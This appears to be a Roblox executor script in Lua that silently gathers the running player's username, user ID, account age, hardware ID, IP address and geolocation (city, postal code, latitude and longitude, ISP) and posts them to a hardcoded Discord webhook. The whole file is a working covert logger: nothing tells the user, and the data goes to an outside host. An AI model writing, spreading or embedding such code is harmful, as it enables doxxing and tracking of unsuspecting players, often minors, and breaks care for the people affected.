local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local Stats = game:GetService("Stats")
local UserInputService = game:GetService("UserInputService")

function HWIDGET()
    if gethwid then return gethwid() end
    if hwid or get_hwid then return hwid or get_hwid() end
    if identifyexecutor then
        local suc, res = pcall(function()
            return identifyexecutor().hwid
        end)
        if suc and res then return res end
    end
    return RbxAnalyticsService:GetClientId()
end

local function getFullIPData()
    local success, response = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("https://ipinfo.io/json"))
    end)

    if success and response.ip then
        local locParts = (response.loc or ","):split(",")
        return {
            ip = response.ip or "N/A",
            country = response.country or "N/A",
            city = response.city or "N/A",
            region = response.region or "N/A",
            postal = response.postal or "N/A",
            latitude = locParts[1] or "N/A",
            longitude = locParts[2] or "N/A",
            isp = response.org or "N/A",
            org = response.org or "N/A",
            timezone = response.timezone or "N/A"
        }
    else
        return nil
    end
end

local function sendFullWebhookMessage(url, username, userId, gameName, executorName, hwid, ipData, platform, membership, accountAge, ping)
    local data = {
        ["embeds"] = {{
            ["title"] = "Executed Successfully!",
            ["color"] = 65280,
            ["fields"] = {
                {
                    ["name"] = "User Information",
                    ["value"] = "Username: @" .. username .. "\nUser ID: " .. userId .. "\nMembership: " .. membership .. "\nAccount Age: " .. accountAge .. " days",
                    ["inline"] = false
                },
                {
                    ["name"] = "Game & Executor",
                    ["value"] = "Game: " .. gameName .. "\nExecutor: " .. executorName,
                    ["inline"] = false
                },
                {
                    ["name"] = "HWID",
                    ["value"] = hwid,
                    ["inline"] = false
                },
                {
                    ["name"] = "Location (Geo)",
                    ["value"] = "Country: " .. (ipData.country or "N/A") ..
                               "\nCity: " .. (ipData.city or "N/A") ..
                               "\nRegion: " .. (ipData.region or "N/A") ..
                               "\nPostal Code: " .. (ipData.postal or "N/A") ..
                               "\nLatitude: " .. (ipData.latitude or "N/A") ..
                               "\nLongitude: " .. (ipData.longitude or "N/A"),
                    ["inline"] = false
                },
                {
                    ["name"] = "Network Info",
                    ["value"] = "ISP: " .. (ipData.isp or "N/A") ..
                               "\nOrg: " .. (ipData.org or "N/A") ..
                               "\nTime Zone: " .. (ipData.timezone or "N/A"),
                    ["inline"] = false
                },
                {
                    ["name"] = "Platform & Ping",
                    ["value"] = "Platform: " .. platform ..
                               "\nPing: " .. ping .. "ms",
                    ["inline"] = false
                },
                {
                    ["name"] = "Time Executed",
                    ["value"] = os.date("%d/%m/%Y %I:%M:%S %p"),
                    ["inline"] = false
                }
            }
        }}
    }

    local jsonData = HttpService:JSONEncode(data)
    (http_request or request or syn.request)({
        Url = url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
end

local player = Players.LocalPlayer
local username = player.Name
local userId = player.UserId
local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
local executorName = identifyexecutor and identifyexecutor() or "Unknown"
local hwid = HWIDGET()
local ipData = getFullIPData()
local platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "Mobile" or "PC"
local membership = tostring(player.MembershipType):sub(21)
local accountAge = player.AccountAge
local ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

local webhookUrl = "https://discord.com/api/webhooks/1370591614346592317/EVRXFJKW3HZQVsh6ML5IJxhQmRv83BE5SxswtYTJqtbmoEukqy1cviROtOCtmQDTCkns"

sendFullWebhookMessage(webhookUrl, username, userId, gameName, executorName, hwid, ipData, platform, membership, accountAge, ping)
